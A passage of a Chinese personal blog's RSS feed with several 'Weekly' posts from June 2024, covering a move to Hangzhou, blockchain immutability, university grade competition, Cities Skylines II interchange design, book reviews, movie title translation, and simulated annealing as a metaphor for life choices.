&lt;p&gt;下周见。&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #6：出发，去（回）杭州！</title><link>https://skywt.cn/blog/weekly-6/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-6/</guid><description>&gt; When we first dropped our bags on apartment floors
&gt; Took our broken hearts put them in a drawer
&gt; Everybody here was someone else before
&gt; And you can want who you want
&gt; Boys and boys and girls and girls
&gt;
&gt; Welcome to New York
&gt; It’s been waiting for you
&gt; Welcome to New York, welcome to New York
&gt;
&gt; —— Taylor Swift《Welcome to New York》

</description><pubDate>Wed, 26 Jun 2024 19:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;When we first dropped our bags on apartment floors&lt;br&gt;
Took our broken hearts put them in a drawer&lt;br&gt;
Everybody here was someone else before&lt;br&gt;
And you can want who you want&lt;br&gt;
Boys and boys and girls and girls&lt;/p&gt;
&lt;p&gt;Welcome to New York&lt;br&gt;
It’s been waiting for you&lt;br&gt;
Welcome to New York, welcome to New York&lt;/p&gt;
&lt;p&gt;—— Taylor Swift《Welcome to New York》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;p&gt;本周忙着搬家，忙着入职，忙着忙着，本期 Weekly 又晚了两天发 T_T……&lt;/p&gt;
&lt;p&gt;关于入职也有很多值得记录的感受，还是留给下一期吧。&lt;/p&gt;
&lt;h2&gt;🌆 封面图：在飞机上&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3281384168.jpg&quot; alt=&quot;封面图：在飞机上&quot;&gt;&lt;/p&gt;
&lt;p&gt;本来订好了火车票的，出发前一天突然决定想要坐飞机。反正能报销，就改为飞机票了。&lt;/p&gt;
&lt;p&gt;很喜欢乘坐飞机的感受。能够感觉到民航产业中蕴含的人类工业文明的力量，俯瞰大自然的时候也能感觉到一种独特的美感。&lt;/p&gt;
&lt;h2&gt;✈️ 出发，去（回）杭州！&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3139962195.jpg&quot; alt=&quot;《光遇》同款的云海！&quot;&gt;&lt;/p&gt;
&lt;p&gt;在飞机上能够看到《光遇》同款的云海！&lt;/p&gt;
&lt;p&gt;在平流层看机翼上的阳光，会发现一个与常识不符合的现象：由于云彩遮挡形成的光斑，变化频率很快，让我们下意识以为是由于飞机其他部件反光引起的。地面上距离云很远，且下层的云更加聚集，导致地面上产生的阴影有变化缓慢的特点。而在飞机飞行的高度，上方云层稀薄且更近，加上飞机运动速度快，导致形成的阴影变化速度快。&lt;/p&gt;
&lt;p&gt;其实我们之所以产生错觉，是因为&lt;strong&gt;我们的一切生活经历都是建立在地面上的&lt;/strong&gt;，我们并没有任何云层之上的生活经验，特别是对于不常坐飞机的我来说。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/361396322.jpg&quot; alt=&quot;落地杭州！第一次以《都市天际线》的视角看杭州呢。&quot;&gt;&lt;/p&gt;
&lt;p&gt;落地杭州！第一次以《都市天际线》的视角看杭州呢。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3675351320.jpg&quot; alt=&quot;杭州地铁居然已经有这么多条线了……&quot;&gt;&lt;/p&gt;
&lt;p&gt;三年不见，杭州居然已经有这么多地铁了。（这个地铁图好像就不是《天际线》能规划出来的了 💦）&lt;/p&gt;
&lt;p&gt;新开通的 19 号线，连通了萧山机场、杭州东站、杭州西站，还有一段在地上的路程。还有连通到周边城市的城际地铁。太酷了！&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3445323898.jpg&quot; alt=&quot;新的生活！&quot;&gt;&lt;/p&gt;
&lt;p&gt;新的生活！&lt;/p&gt;
&lt;p&gt;来到一个新的环境，有一切令人兴奋的事情。留给未来的日子慢慢体验吧～&lt;/p&gt;
&lt;p&gt;下周再见～&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #5：夏天的晚霞</title><link>https://skywt.cn/blog/weekly-5/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-5/</guid><description>&gt; 也许有更好的时代，但这个时代是我们的。

</description><pubDate>Tue, 18 Jun 2024 07:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;也许有更好的时代，但这个时代是我们的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图 ：夏天的晚霞&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/4196270677.jpg&quot; alt=&quot;封面图：夏天的晚霞&quot;&gt;&lt;/p&gt;
&lt;p&gt;夏天总是会有很好看的晚霞。&lt;/p&gt;
&lt;h2&gt;⛓️ 区块链的不可篡改特性&lt;/h2&gt;
&lt;p&gt;人类历史上所有记录信息的方式，都有这样的特点：&lt;strong&gt;随着时间的推移，记录的信息变得逐渐模糊。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;区块链打破了这一规则，并且正好相反：&lt;strong&gt;随着时间的推移，曾经记录信息的区块被越来越多的后续区块确认，即推翻这个区块也越来越难。&lt;/strong&gt;在链上每追加一个区块，都是对之前所有区块的一次确认，自然而然地「维护」了之前的信息。&lt;/p&gt;
&lt;p&gt;（当然，以上的讨论仅限于全球互联网仍然存在的前提。如果互联网不在了，或者分裂为多个不连通的区域，或者如果没有电力了，甚至如果人类文明都不在了，或许还是用《三体》中提到的「把字刻在石头上」这类方式保存信息最靠谱）&lt;/p&gt;
&lt;p&gt;比特币等加密货币，只是上述特性的一个很小的应用：将&lt;strong&gt;交易记录&lt;/strong&gt;这一信息永远放在链上。&lt;/p&gt;
&lt;p&gt;以合同签署为例。其实，现代纸质合同并不可靠。无论是手写签字还是盖章，都无法避免合同伪造：1）某一方可以伪造合同的签字或盖章，然后宣称对方和自己签署了这个合同；2）某一方也可以不承认曾经签字或盖章，否认自己签署了某个合同。综合这两点，如果在法庭上产生「一方拿出合同，一方否认合同」的纠纷，究竟是拿出合同的这一方伪造了合同，还是否认合同的这一方单方面不承认合同？法庭是无法判断的（如果没有其他信息的话）。不难发现，虽然《合同法》尝试构建一个客观的合约系统，但是事实上很难做到这一点。&lt;/p&gt;
&lt;p&gt;而区块链技术让真正严格、客观的合同签署成为了可能。以太坊的「智能合约」即是应用方式之一。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;真正推动人类文明进步的技术创新，就是将历史上不可能的事情变成可能。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;之前考虑将博客同步到 xLog，这是一个基于区块链的博客平台。所有博客文章、评论、互动等都发布在链上。仔细想想，这有点可怕：如果一篇文章被我发布到区块链上，&lt;strong&gt;将永远无法将其删除！&lt;/strong&gt;如果现在博客里有些以后看来不合时宜的话呢？如果未来要经历背景调查、政治审查或者其他事件，需要删除曾经发过的内容呢？&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;对数据的掌控权，也包括对数据进行删除的权利。&lt;/strong&gt;传统的 Web，发布的文章随时都能删除，删除后就无法被访问。即使是不经过我们同意就备份网页的 Web Archive，也可以给他们发邮件请求删除页面。当然，任何人都能备份博客内容，但至少这种备份是主动的行为。而在区块链上发布的内容，只要这条链还有人在使用，则内容将永生永世无法被删除，永远轻易地被访问。细思恐极！&lt;/p&gt;
&lt;p&gt;开发者 DIYgod 也在&lt;a href=&quot;https://v2ex.com/t/882349&quot;&gt;V2EX&lt;/a&gt; 提到了存在的问题：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;链上操作都是透明和不可撤销的，这导致用户无法真正删除一篇文章，通过区块链历史可以看到文章的修改记录。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;📑 如果能回到大一大二……&lt;/h2&gt;
&lt;p&gt;直到大三，我决定且确定不读研了，才开始探索自我，真正感觉到大学生活应该这样度过。&lt;/p&gt;
&lt;p&gt;大三之前，我还是希望保研的。要争保研就得卷成绩，太痛苦了，太卷了。每节课的考勤、每个小组作业或者 pre、每个实验作业，都要计入成绩。换句话说，如果要争取保研，一切的目标就是成绩，成绩以外的一切因素都和大学生活无关了。特别是 HNU 取消了论文、竞赛保研的背景下。&lt;strong&gt;大学不应该是这样的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;仔细想想，成绩排名真的这么合理吗？考试成绩和能力水平显然不是线性关系，80 分要求我们对课程知识有完善的掌握，而 90 分或者 95 分甚至更高，则要求进行大量的刷题，对所有题型做到滚瓜烂熟。在 80 分以上有非常明显的边际效应，需要投入大量的时间，也就是所谓的「卷」。要筛选足够水平的人，以 80 分为门槛完全够了；而就是因为&lt;strong&gt;保研名额有限（即教育资源不足）&lt;/strong&gt;，才硬要按照排名选前几名的同学。结果，选出的是实际水平差不多，但&lt;strong&gt;刷了更多题&lt;/strong&gt;的同学。这种排名制度岂不是完完全全在培养「做题家」吗？&lt;/p&gt;
&lt;p&gt;（当然，公不公平、合不合理也是相对的。任何一种制度，其既得利益者往往倾向于认为其是公平的，而利益受损的人则倾向于认为其不公平。只要参加过辩论赛，就能有这样的体会：有的真理不是越辩越明的）&lt;/p&gt;
&lt;p&gt;现在大三已经接近尾声，我觉得有点后悔。如果我早一点决定不读研，也不至于大一大二花这么多时间卷成绩。为了争取保研，我们都身不由己。&lt;/p&gt;
&lt;p&gt;如果能回到大一大二，我一定要少花点时间卷成绩，花更多时间学习、阅读、参加社交活动，听更多讲座，探索更多世界。大学四年时光太宝贵，应该花在更有意义的事情上才对。不过「如果」这样的假设并没有意义，毕竟当时没有不读研的决心；我能做的只有珍惜剩下的不到一年在校时光。&lt;/p&gt;
&lt;h2&gt;🌆 Cities Skylines II&lt;/h2&gt;
&lt;p&gt;《都市天际线 2》这个游戏真的非常令人上瘾。本周周末重新玩了一会，结果一不小心又玩到了凌晨 😇。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为什么这个游戏有如此魔力？&lt;/strong&gt;我觉得主要在于其&lt;strong&gt;快速反馈&lt;/strong&gt;的特性。本质上，设计一个城市，和做开发写程序、画电路板、写一篇文章的过程是一样的，都是&lt;strong&gt;创造&lt;/strong&gt;的过程。区别在于，反馈周期和反馈强度不同。写程序的反馈只是程序成功跑起来了，或许只是一行简单的提示，即使是前端也是若干 UI 而已；而在 Cities Skylines 里设计一个城市，立即会有市民入住，车水马龙，一辆辆车和一个个行人，都是真实存在在这个小小的虚拟世界里活动着的物体。我们能看到这是一种快速的反馈，给人成就感。&lt;/p&gt;
&lt;p&gt;这个游戏让我看到了新的世界。&lt;/p&gt;
&lt;p&gt;比如一个城市的交通总体设计，我以前从来没有留意过。道路是有分级的，从高速公路、城市快速路到主干道路、二级道路、小巷等。城市环线就是一种很好的城市快速路的方式。越高级的道路，车速越快，路口应该越少。为什么要有小区、园区的概念？从道路设计的角度来说，目的之一是防止在主干道上产生过多的路口。有了这些实际的体验，当我来到一个新的城市，在看地图的时候我能够对城市的结构有更加系统性的了解。&lt;/p&gt;
&lt;p&gt;比如关于立交桥。在接触这个游戏之前，在面对大城市的巨型立交桥的时候，我只能感觉到一种人类工业文明的力量感（类似坐民航客机的感觉），但是对其具体的逻辑是没有认知的。现在我才知道，立交桥的本质是&lt;strong&gt;避免道路交叉&lt;/strong&gt;。在十字路口，每个方向车道有左转、直行、右转三种选择，而四个方向来的这些路线难免会交叉。为了解决这一问题，简单的解决方案是&lt;strong&gt;红绿灯&lt;/strong&gt;或者&lt;strong&gt;环岛&lt;/strong&gt;，但是这两种方案都需要车辆减速甚至停止等待，这在高速公路上是不可接受的。那么，在高速公路的交叉口，为了解决这一问题，可以通过精心设计的匝道连接，让每个车道左转、直行、右转都能直接到达对应车道。而为了避免交叉，这些匝道需要利用纵向立体空间，故名曰「立交桥」。知道了这一原理，所有看似复杂的立交桥在我眼里就不再是神秘的庞然大物了，我们甚至可以自己设计立交。&lt;/p&gt;
&lt;p&gt;在游戏里最常见的是苜蓿叶立交和堆栈式立交。苜蓿叶最容易造，堆栈式就比较复杂，从上到下一共要分四层。下面就是我第一次手搓的堆栈式立交。虽然还是很堵……（其实我觉得最酷的是涡轮立交，但是太难造了）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3176215674.png&quot; alt=&quot;第一次手搓的堆栈立交！&quot;&gt;&lt;/p&gt;
&lt;p&gt;创造的过程本身就很令人兴奋。可以实践自己的各种关于城建的有趣想法。比如我在玩的城市取名「千岛市」，基于这样的理念：每个小区或者园区都是有相对的独立性的，可以将它们做成一小块一小块的岛屿，通过海上的高速公路连接。而许多功能分区也能建造成独立的岛屿，比如「文体中心岛」、「大学岛」、「航空岛」，每个岛都要修精致的环岛路和护岸！在「大学岛」我可以打造自己梦想的大学，要修一条环岛电车轨道（一直觉得电车很浪漫，估计是新海诚的电影给我的印象）。地铁轨道也可以修在海面之上，就像厦门一样！海上高速公路的交界，可以修建海上立交……太酷了！&lt;/p&gt;
&lt;p&gt;游玩一个新的游戏，也是打开一个新的世界。&lt;/p&gt;
&lt;h2&gt;🎨 一些有设计感的官方网站鉴赏&lt;/h2&gt;
&lt;p&gt;一般来说，政府机构的官方网站都是很烂的。这并不是我国独有的现象，而是政府机构的性质决定的。然而网上冲浪的时候偶然能发现几个我觉得做得非常不错的政府机构官方网站，有些惊艳到我。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.beijing.gov.cn&quot;&gt;北京市政府&lt;/a&gt;：这个配图和色调实在是太漂亮了，第一眼看到就有一种既温暖又庄严的感觉。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/76567892.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.visitfinland.com/zh/&quot;&gt;芬兰旅游局&lt;/a&gt;：准确来说是芬兰旅游局开设的 Visit Finland 网站。这个网站风格非常现代，开屏是视频背景，而且加载完了有一个从黑色背景 fade-in 的效果。主标题是 slogan，「世界上最幸福的国家」。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/1706280651.png&quot; alt=&quot;芬兰旅游局网站&quot;&gt;&lt;/p&gt;
&lt;h2&gt;💬 Quotes&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;If you&apos;re not embarrassed by the first version of your product, you&apos;ve launched too late.&lt;/p&gt;
&lt;p&gt;—— &lt;a href=&quot;https://x.com/reidhoffman/status/847142924240379904&quot;&gt;Reid Hoffman&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;谨将此书译献给，一切有理想的现实主义者和有现实感的理想主义者！&lt;/p&gt;
&lt;p&gt;—— 马基雅维利《君主论》（拿破仑批注版），刘训练译注&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;每个个体被定义与记住的，是与同类的不同点，而不是相同点。&lt;/strong&gt;与所有其他人做一样的选择，就会收获与其他人一样的结果。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;人生回首时，我们最后悔的大多数不是做了的事，而是没做的事，不是吗？&lt;/strong&gt;同学们可以想想，几十年后你坐在壁炉边时，会希望今天的你做出怎样的决定，奔赴怎样的伟大可能。&lt;/p&gt;
&lt;p&gt;—— 真格基金《&lt;a href=&quot;https://mp.weixin.qq.com/s/S1W4pxa6YKcAa36MclWUYQ&quot;&gt;写给更年轻的人&lt;/a&gt;》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Just pirate it. If you still like it when you can afford it in the future, buy it then. Also don&apos;t forget to feel bad. ;)&lt;/p&gt;
&lt;p&gt;—— @notch from Minecraft&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;📚 本周在读：《第一本经济学》、《童年的消逝》、《世上为什么要有图书馆》&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;《第一本经济学》&lt;/strong&gt;。高中政治老师推荐的经济学教材，现在才开始读。本书介绍的许多知识其实高中政治必修一都学过，所以首先当作复习了。&lt;/p&gt;
&lt;p&gt;本书补充的是经济学的全局视角，因为高中教材只是简单的入门，并且对许多问题避而不谈，这本书能带来更加全面的视角。本书介绍了市场经济、计划经济以及混合经济（包括种种干预措施和影响）。不过，显然本书偏向于支持纯粹市场经济，认为许多政府干预行为反而导致了经济萧条。&lt;/p&gt;
&lt;p&gt;我们中学接受的教育都是所谓的「社会主义视角」，而我感觉看到的越来越多的书为我们补充了「资本主义视角」。比如《黑客与画家》《穷爸爸富爸爸》等等。前者认为，贫穷是由于资本的剥削压迫；后者则认为，贫穷是由于认知水平的低下，在一个相对公平的社会里，人可以抓住机遇、创造财富。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;《童年的消逝》&lt;/strong&gt;。将年纪小的人称为社会意义上的儿童并特殊地对待他们，即「童年」的概念，是人类特有的，也是最近几百年才形成的，在此之前，法律对儿童没有特殊对待，社会也不将儿童与成人区别开来（即没有「儿童」、「成人」的社会概念）。本书探究「童年」这一概念是如何产生的，并揭示：在当今时代，「童年」这一概念正在逐步消逝。&lt;/p&gt;
&lt;p&gt;本书认为，活字印刷术的发明，是传播媒介的一大进步。从此，儿童需要学习才能掌握获取信息的方式，从而成人能够向儿童隐藏信息。而电视的发明，是传播媒介的一大反动（名词解释：反动，指违反历史发展方向），使得文化传播退化回 15 世纪还未发明活字印刷术的时代，即传播信息的渠道无需任何学习即可掌握。本书内核类似《娱乐至死》，只是作者讨论的角度聚焦于儿童这一概念。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;《世上为什么要有图书馆》&lt;/strong&gt;，超喜欢这本书。作者是一名文学领域的博士，来到西安市做文旅局挂职副局长，负责了西安市碑林区图书馆的建设。本书展示了体制内一些我从未接触过的东西，很新奇。也揭示了作为一名传统意义上的文人，是如何面对官场（体制内）各种荒诞的。其实在读的时候频繁有这样的感受：他们文学家，和我们「理科生」，看待世界的视角真不一样。&lt;/p&gt;
&lt;p&gt;（其实真正让我对体制内工作完全劝退的一本小说是《沧浪之水》，非常推荐阅读）&lt;/p&gt;
&lt;p&gt;下周见～&lt;/p&gt;
</content:encoded><author>me@skywt.cn</author></item><item><title>Weekly #4：阅读与人生自我设计</title><link>https://skywt.cn/blog/weekly-4/</link><guid isPermaLink="true">https://skywt.cn/blog/weekly-4/</guid><description>不知你发现了没有，每期 Weekly 的标题，都取自各个小标题其中的一个。这种行为有点像刘慈欣出版一本中短篇小说集，其中包含《流浪地球》这篇，然后小说集取名为《流浪地球》。我也不知道为什么，总之有些不明觉厉。

本周在忙一件很重要的事情，忙完了之后感觉特别累，所以放假了几天，导致本期 Weekly 延迟到今天才发。抱歉～

</description><pubDate>Wed, 12 Jun 2024 07:00:00 GMT</pubDate><content:encoded>&lt;p&gt;不知你发现了没有，每期 Weekly 的标题，都取自各个小标题其中的一个。这种行为有点像刘慈欣出版一本中短篇小说集，其中包含《流浪地球》这篇，然后小说集取名为《流浪地球》。我也不知道为什么，总之有些不明觉厉。&lt;/p&gt;
&lt;p&gt;本周在忙一件很重要的事情，忙完了之后感觉特别累，所以放假了几天，导致本期 Weekly 延迟到今天才发。抱歉～&lt;/p&gt;
&lt;!--more--&gt;
&lt;h2&gt;🌆 封面图：岳麓山电视塔&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.skywt.cn/usr/uploads/2024/06/3825495231.jpg&quot; alt=&quot;封面图：岳麓山电视塔&quot;&gt;&lt;/p&gt;
&lt;p&gt;其实长沙是个巨大的迪厅。😁&lt;/p&gt;
&lt;h2&gt;🎬 中文和英文的电影命名&lt;/h2&gt;
&lt;p&gt;本周重温了皮克斯的《飞屋环游记》。才知道，这部电影的英文名居然就叫 &lt;em&gt;Up&lt;/em&gt;。&lt;/p&gt;
&lt;p&gt;似乎有很多电影，英文电影名都是一个很简单的单词，言简意赅；而中译名却加上了丰富的内容。我能想到的就有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Up&lt;/em&gt; ——《飞屋环游记》。直译「往上」。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Coco&lt;/em&gt; ——《寻梦环游记》。我最不理解，老奶奶 Coco 只是个配角，并没有完全参与故事主线呀！&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Frozen&lt;/em&gt; ——《冰雪奇缘》。直译「冻住的」。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Tangled&lt;/em&gt; ——《魔发奇缘》。直译「纠缠不清的」。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Moana&lt;/em&gt; ——《海洋奇缘》。又是人名作电影名。以及迪士尼似乎很喜欢用「奇缘」。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Soul&lt;/em&gt; ——《心灵奇旅》。直译「灵魂」。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Cruella&lt;/em&gt; ——《黑白魔女库伊拉》。又是人名作电影名。&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Leon&lt;/em&gt; ——《这个杀手不太冷》。这个属实是翻译太神了。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不难发现，英文名都比较抽象，虽然只有一个单词，但往往有双关或者多重含义，在电影中表达多种含义。比如 Tangled 既是说 Rapunzel 的头发纠缠不清，也是说电影讲述的故事纠缠不清；Frozen 不仅是 Elsa 的魔法能力，也是片头曲「Beware the frozen heart」揭示的她在隔阂解开之前内心的冰冷（这个片头曲实在是太草蛇灰线了）。&lt;/p&gt;
&lt;p&gt;似乎在很多地方，英文的表达都抽象很多。比如某些词加 er 直接表达经常进行这一概念的主体，而中文则要根据实际意思，将其变换为「xx 者」、「xx 器」等，对该主体进行描述。&lt;/p&gt;
&lt;h2&gt;📚 阅读与人生自我设计&lt;/h2&gt;
&lt;p&gt;本周听了龚曙光老师的岳麓讲坛，主题是《阅读与人生自我设计》。&lt;/p&gt;
&lt;p&gt;读的书越多，越喜欢阅读。因为我们的人生太有限，有太多我们体验不到的东西，而在书里可以看见。书籍能够让我们对这个世界建立足够的认知，以此规划我们的人生。&lt;/p&gt;
&lt;p&gt;龚曙光老师提出，最重要的是要时刻保持清醒。要对&lt;strong&gt;时代的主潮&lt;/strong&gt;有一个清醒的认识。他以他读到的《十九世纪文学主潮》为例（虽然我在查了之后发现这本书更常见的译名叫《十九世纪文学主流》，但是我觉得「主潮」这个词更酷）。龚曙光老师还举出了新文化运动的例子：面对新文化运动这样一场轰轰烈烈的革命，鲁迅就抓住这个机遇，创造白话文的新文体；而同时期的王国维则旗帜鲜明地反对，一心维护传统文化。他们做出了不同的决策，但是他们都对时代的主潮——新文化运动，有同样清醒的认知：新文化运动是要革传统文化的命的。他们的决定都是基于自己的清醒认知，而不是人云亦云。&lt;/p&gt;
&lt;p&gt;换到现在，不管是选择就业、考研、保研、考公，我们都要对时代主潮有清醒的认识。这要求我们对世界和时代有足够的认识。而大多数人都不能做到这一点，而是出于迷茫或者父母逼迫来作出选择。&lt;/p&gt;
&lt;p&gt;龚曙光老师说到「随缘式阅读」时谈到自己的经历，说自己 45 岁时才读到一本有关建筑设计的书，这才发现自己有多么喜欢这个领域。可惜读到这本书时他已经 45 岁了。如果能早一些读到这本书，他或许不会读中文系，不会成为一个作家，或许会成为一个建筑设计师！所以，一定要广泛阅读，不管什么领域的书都可以读。「任何书来到我们身边都是一种缘分。」此谓「随缘式阅读」。&lt;/p&gt;
&lt;p&gt;想到我从小就对计算机有兴趣，从小学在爸妈开的超市里玩电脑，到中学参加 OI 训练和比赛，到大学选了计算机的专业。这一切是不是源于一种偶然，因为我小时候能轻易接触到的「世界」只有计算机的世界呢？如果我的父母是物理学科研人员，说不定我就会对物理学感兴趣；如果我的父母是法官或者检察官，我说不定就会对法学感兴趣……（本学期选了《西方法律思想史》的专选课程，就发现自己对法律很有兴趣）&lt;/p&gt;
&lt;p&gt;换句话说，目前对计算机的兴趣，很可能是陷入了一个&lt;strong&gt;局部最优解&lt;/strong&gt;。这告诉我，不能停止广泛的阅读。&lt;/p&gt;
&lt;p&gt;本次讲座还涉及很多内容，可查看：&lt;a href=&quot;https://mp.weixin.qq.com/s/is-V5_5RwpRnwDLWm8Jbtg&quot;&gt;讲坛回顾|龚曙光：阅读与人生自我设计&lt;/a&gt;。「人生自我设计」这个概念很酷。龚老师的青年时期在文革中度过，没什么书读；而我们在如今这个信息和知识丰富的时代，能够得到任何我们想要的书籍。上一代人在开启人生之前，没有条件形成足够的认识，所以没有条件设计自己的人生，被时代洪流裹挟着前进；而我们则足够幸运，有这样的机会，进行「人生自我设计」。&lt;/p&gt;
&lt;h2&gt;🔥 模拟退火算法与人生决策&lt;/h2&gt;
&lt;p&gt;上周提到的《How We Learn》这本书太有意思了。我们学了很多机器学习相关的理论，事实上这些算法都是科学家模拟人脑运行原理的尝试。通过这些算法的原理，我们能反过来理解我们大脑学习的原理。书中提到了 Gradient Decent 和模拟退火算法，仔细想想，这个算法其实能够应用于我们的人生决策。&lt;/p&gt;
&lt;p&gt;我们的人生可以看成一个最优化过程。根据自己的兴趣和自己擅长的事情以及各条道路发展前景，选择自己的专业、职业并投入，获得最大化的收益。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我们大脑默认使用 Gradient Decent 梯度下降算法，容易陷入局部最优解。&lt;/strong&gt;如前所述，或许我选择计算机领域作为我的目标，就是一个局部最优解。说不定有我更喜欢的、更感兴趣的领域，我没发现而已。&lt;/p&gt;
&lt;p&gt;我们都学过，为了解决这一问题，尽量找到全局最优解，可以使用&lt;strong&gt;模拟退火算法&lt;/strong&gt;。设定初始温度 $T_0$，缓慢降温，在温度 $T$ 下，找到当前状态 $x$ 的一个临近解 $x_1$，计算目标函数 $f(x_1)$，与 $f(x)$ 相比较，&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果 $f(x_1)$ 更优或不变，则进入 $x_1$。&lt;/li&gt;
&lt;li&gt;如果 $f(x_1)$ 更劣，则以概率 $p=\exp(-\frac{\Delta E}{T})$ 进入 $x_1$，其中 $\Delta E = f(x_1)-f(x)$​。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是说，算法有概率走向更劣的状态；并且随着温度降低，选择更劣状态的概率降低。&lt;/p&gt;
&lt;p&gt;在理论上，如果温度下降足够缓慢，则可以证明该算法以概率 1 收敛到全局最优解。在实际应用中，其实有较大概率找到全局最优解。&lt;/p&gt;
&lt;p&gt;如果将我们的人生看作最优化过程，那么温度从一开始就是缓慢下降的，到死亡时（或者到事业的终点）降为 0。我们可以应用模拟退火算法的定性结论：&lt;strong&gt;所处阶段越早，越应该尝试更劣解；所处阶段越晚，越应该追逐更优解。&lt;/strong&gt;所以，&lt;strong&gt;在年轻的时候应该多尝试新事物，这是能证明的更优决策。&lt;/strong&gt;如果从现在就确定计算机领域是我一生追求的事业，这或许是非常不妥的。&lt;/p&gt;
&lt;p&gt;当然，将这一模型比做我们的人生旅途，有诸多局限性。我能想到的有二：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;没有考虑尝试成本。&lt;/strong&gt;算法假设所有信息可知，对目标函数 $f(x)$ 的计算是不计成本的，然而我们的日常生活中任何的尝试都要计量成本，不管是时间、精力还是钱财；对于不同的人生阶段，某些尝试行为的成本也是不同的。&lt;/li&gt;
&lt;li&gt;将人生视为最优化过程的前提，包含了&lt;strong&gt;价值一元论&lt;/strong&gt;的假设。「价值一元论」假设所有价值都能被统一到一个维度上，即 如果确定了 $x$，人生中的目标函数 $f(x)$ 是可计算的。然而，事实并非如此。看《刘擎西方现代思想讲义》中提到，柏林提出了「多元价值的不可公度性」，认为不同的价值之间无法换算，冲突无法避免。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;有一个有趣的推论：&lt;strong&gt;如果价值一元论成立的话，人生其实是有最优决策的。&lt;/strong&gt;对任何决策选项都能计算得到价值，对于任何信息不足的选项或者概率事件，针对相应概率计算期望，选择期望价值最高的选项即可。这样看来，我们的人生也太没意思了。&lt;strong&gt;正因为人需要在个人与集体、生命与追求、现实与梦想这些不可调和（不可统一到同一个维度）的价值之间作出决策并承担后果，人生才充满刺激，如此精彩呀。&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;🤔 关于闲暇&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;在希腊语中，“学校”一词的意思是“闲暇”。这反映了一种典型的雅典式的信仰：他们认为闲暇时，一个文明人自然会花时间思考和学习。&lt;/p&gt;
&lt;p&gt;——《童年的消逝》&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;突然觉得，可能是最近太闲了，才会写 Weekly。本周由于有别的某件事情要忙，导致这篇就延迟发布了。&lt;/p&gt;
&lt;p&gt;现在的我们深居象牙塔，我又不热衷于卷成绩，暑期阶段性的 offer 也有着落了，所以能够拥有闲暇。这种闲暇给我阅读和学习的时间精力，让我能够思考和进步。然而，等以后进互联网大厂，如果要 996，我还有什么属于自己的时间可以学习和成长呢？&lt;/p&gt;
&lt;p&gt;可以想像那样的生活每天都会很累。我甚至还有精力阅读吗？&lt;/p&gt;
&lt;p&gt;这再次提醒我，剩下的在学校的时光是多么珍贵。我真希望能够从中学就开始广泛地阅读，只是当时我们一心准备竞赛和高考，我们在那一人生阶段是没有什么「决策空间」的，阅读建立的认知几乎无法产生收益。而当工作之后，996 的生活可能也不会给我们很多时间精力阅读。这样算下来，大学四年是唯一能够有时间精力广泛阅读的 gap。&lt;/p&gt;
